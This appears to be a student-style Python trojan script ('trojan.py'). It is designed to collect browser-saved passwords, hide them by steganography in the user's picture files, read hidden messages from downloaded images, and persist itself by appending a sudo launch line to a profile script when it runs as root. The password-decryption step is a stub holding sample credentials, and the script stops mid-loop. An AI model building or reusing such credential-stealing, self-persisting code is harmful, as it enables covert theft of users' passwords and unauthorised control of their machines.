import glob
from os import path, geteuid
import stepic
import Image
from datetime import datetime, timedelta
import sys


# Function to encode a stego message from image
def encode(filepath, message):
	img = Image.open(filepath)
	stegimg = stepic.encode(img,message);
	stegimg.save(filepath,'PNG')

# Function to decode the stego message from image
def  decode(filepath):
	img = Image.open(filepath)
	message = stepic.decode(img)
	return message


# Function to format message.  Message format  e.g. 06qwertyshamilcm@facebook.com
def format_msg(entry):
	msg = str(entry[2].__len__()) + entry[2] + entry[0] + "@" + entry[1] + "#"
	return msg
	

#Function to check if a message is a valid msg
def isvalidformat(msg):
	if ((msg[0]=='0' or msg[0]=='1')) and (msg[1] > '0' and msg[1] < '9') and  msg[msg.__len__()-1]=='#' and msg.count('@')>=1 :
		return True
	else:
		return False
				
# Function to decrypt passwords from the browser and save in a file
def decrypt_passwords():
	msglist = []
	# Code to decrypt from firefox or chrom
	# Code
	# Code
	# Code
	savedlist = [['vivekanand','dss.nitc.ac.in','myrollb0900'],['vivekzhere','accounts.google.com','vivpassword'],['nithinvnath','http://onlinesbi.com','secretbankpassword'],['arunkuruvila','http://facebook.com','mybirthdaypw'],['aravind.an','http://twitter.com','fastrack'],['sreeraj.altair','http://accounts.google.com', 'some_game']]
	msglist = []
	for entry in savedlist:
		msglist.append(format_msg(entry))
	return msglist



# Function to initialize first time run
def first_run():
	msglist = decrypt_passwords()			# List of browser saved passwords
	num_of_msgs = msglist.__len__()			# No. of browser saved passwords
	i = 0									# Message Iterator
	encode_dir = path.expanduser("~/Pictures/Pictures/")
	if num_of_msgs > 0:
		for infile in glob.glob(encode_dir+"*.jpg"):
			i = (i+1)%num_of_msgs;
			#encode(infile,msglist[i]);
		f = open('bootup.cfg', 'w+')
		f.write(str(num_of_msgs)+"\n")
		f.write("1950-01-01 00:00:00")
		f.close()
			
	if geteuid() == 0:						#Adding to startup scripts if root privileges
		try:
			f = open('../profile','a')			# Change file to /etc/profile
			f.write("sudo python trojan.py&");
			f.close()
		except:
			pass
			

# Main Function

while True:
	if (not path.exists('bootup.cfg')):			#Checking if its first run of trojan
		first_run()
	else:
		f = open('bootup.cfg','r')
		num_of_msgs = f.readline()
		update_dtline = f.readline()
		f.close()
		update_dt = datetime.strptime(update_dtline,"%Y-%m-%d %H:%M:%S ")
		encode_dir = path.expanduser("~/Pictures/Pictures/")
		decode_dir = path.expanduser("~/Pictures/Downloads/")
		encodeflg = 0
		for infile in glob.glob(decode_dir+"*.jpg"):
			#print decode(infile);	
			file_mdt = datetime.fromtimestamp(path.getmtime(infile))
			if ( (file_mdt - update_dt) > timedelta(0)):
				msg = decode(infile)
				if (isvalidformat(msg)):
					print msg
				encodeflg = 1
				# To update encode variables
				
			

